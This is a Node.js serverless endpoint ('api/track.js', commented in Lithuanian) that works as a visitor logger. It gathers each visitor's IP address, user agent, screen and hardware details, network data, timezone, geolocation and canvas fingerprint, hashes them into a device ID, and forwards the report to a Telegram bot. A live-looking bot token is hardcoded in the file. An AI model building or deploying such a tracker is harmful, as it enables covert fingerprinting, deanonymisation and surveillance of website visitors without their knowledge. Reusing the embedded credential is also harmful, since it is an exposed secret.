// api/track.js

// 🔐 TAVO TELEGRAM DUOMENYS
const TELEGRAM_BOT_TOKEN = "8317265281:AAGMUZ8Tgu6nGPG2S_fUULvPhjfcubvI5js";
const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"; // ← ČIA ĮRAŠYK SAVO CHAT ID (pvz. "512345678")

// Paprastas hash, kad gautume device_id (nereikia crypto modulio)
function simpleHash(str) {
  str = String(str || "");
  let hash = 0;
  for (let i = 0; i < str.length; i++) {
    hash = (hash << 5) - hash + str.charCodeAt(i);
    hash |= 0; // 32-bit int
  }
  return hash.toString(16);
}

module.exports = async (req, res) => {
  if (req.method !== "POST") {
    res.statusCode = 405;
    return res.end(JSON.stringify({ ok: false, error: "Method not allowed" }));
  }

  try {
    // ---------- BODY PARSINIMAS ----------
    let body = "";
    await new Promise((resolve, reject) => {
      req.on("data", (chunk) => {
        body += chunk;
      });
      req.on("end", resolve);
      req.on("error", reject);
    });

    let js = {};
    try {
      js = body ? JSON.parse(body) : {};
    } catch (e) {
      js = {};
    }

    // ---------- SERVERIO DUOMENYS ----------
    const now = new Date().toISOString();

    let ipHeader =
      req.headers["x-forwarded-for"] ||
      req.headers["x-real-ip"] ||
      req.socket?.remoteAddress ||
      null;

    let ip = Array.isArray(ipHeader) ? ipHeader[0] : ipHeader;
    if (ip && ip.includes(",")) {
      ip = ip.split(",")[0].trim();
    }

    const forwardedIp = req.headers["x-forwarded-for"] || null;
    const userAgent = req.headers["user-agent"] || "";
    const langHeader = req.headers["accept-language"] || "";
    const referer = req.headers["referer"] || "";

    const isMobile = /Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
      userAgent
    )
      ? "Taip"
      : "Ne";

    // ---------- JS DUOMENYS ----------
    const screen_w = js.screen_width ?? "N/A";
    const screen_h = js.screen_height ?? "N/A";
    const avail_w = js.avail_width ?? "N/A";
    const avail_h = js.avail_height ?? "N/A";
    const pixel_ratio = js.pixel_ratio ?? "N/A";

    const timezone_js = js.timezone ?? "N/A";
    const platform_js = js.platform ?? "N/A";

    const lang_js = js.language ?? "N/A";
    const languages_js = js.languages ?? [];

    const hw_threads = js.hardwareConcurrency ?? "N/A";
    const device_mem = js.deviceMemory ?? "N/A";

    const geolocation = js.geolocation ?? "N/A";
    const canvas_fp = js.canvas_fp ?? "";

    const connection = js.connection ?? {};
    const net_type = connection.effectiveType ?? "N/A";
    const net_downlink = connection.downlink ?? "N/A";
    const net_rtt = connection.rtt ?? "N/A";
    const net_saveData =
      typeof connection.saveData === "boolean"
        ? connection.saveData
          ? "Taip"
          : "Ne"
        : "N/A";

    const ua_model = js.ua_model ?? "N/A";

    const languages_str = Array.isArray(languages_js)
      ? languages_js.join(", ")
      : String(languages_js);

    // ---------- DEVICE ID ----------
    const device_id = simpleHash(
      [
        userAgent,
        `${screen_w}x${screen_h}`,
        timezone_js,
        (canvas_fp || "").slice(0, 64),
        ua_model,
      ].join("|")
    );

    const device_mem_str =
      device_mem !== "N/A" && typeof device_mem === "number"
        ? `${device_mem} GB`
        : String(device_mem);

    // ---------- TELEGRAM ŽINUTĖ ----------
    let msg = `*Naujas apsilankymas* 🔔\n\n`;
    msg += `*🕒 Laikas:* \`${now}\`\n\n`;

    msg += `*🌐 IP informacija:*\n`;
    msg += `- IP: \`${ip || "N/A"}\`\n`;
    msg += `- X-Forwarded-For: \`${forwardedIp || "N/A"}\`\n\n`;

    msg += `*📱 Įrenginys:*\n`;
    msg += `- Mobilus: *${isMobile}*\n`;
    msg += `- Platforma (JS): \`${platform_js}\`\n`;
    msg += `- Modelis (jei pavyko): \`${ua_model}\`\n`;
    msg += `- CPU branduoliai: \`${hw_threads}\`\n`;
    msg += `- RAM: \`${device_mem_str}\`\n`;
    msg += `- Device ID: \`${device_id}\`\n\n`;

    msg += `*📶 Tinklas:*\n`;
    msg += `- Tipas: \`${net_type}\`\n`;
    msg += `- Downlink: \`${net_downlink} Mbps\`\n`;
    msg += `- RTT: \`${net_rtt} ms\`\n`;
    msg += `- Data saver: \`${net_saveData}\`\n\n`;

    msg += `*🖥 Ekranas:*\n`;
    msg += `- Rezoliucija: \`${screen_w} x ${screen_h}\`\n`;
    msg += `- Available: \`${avail_w} x ${avail_h}\`\n`;
    msg += `- Pixel ratio: \`${pixel_ratio}\`\n\n`;

    msg += `*🌍 Kalbos:*\n`;
    msg += `- Header: \`${langHeader}\`\n`;
    msg += `- JS language: \`${lang_js}\`\n`;
    msg += `- JS languages: \`${languages_str}\`\n\n`;

    msg += `*📌 Vieta:*\n`;
    msg += `- Timezone: \`${timezone_js}\`\n`;
    msg += `- Geo (jei leido): \`${geolocation}\`\n\n`;

    msg += `*🔍 User-Agent:*\n\`${userAgent}\`\n`;
    msg += `*↩️ Referer:* \`${referer || "N/A"}\``;

    // ---------- SIŲNČIAM Į TELEGRAM ----------
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error("Nenurodytas TELEGRAM_BOT_TOKEN arba TELEGRAM_CHAT_ID");
    } else {
      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      try {
        await fetch(telegramUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: msg,
            parse_mode: "Markdown",
          }),
        });
      } catch (e) {
        console.error("Telegram klaida:", e);
      }
    }

    res.statusCode = 200;
    return res.end(JSON.stringify({ ok: true }));
  } catch (err) {
    console.error("Server error:", err);
    res.statusCode = 500;
    return res.end(JSON.stringify({ ok: false, error: "Server error" }));
  }
};
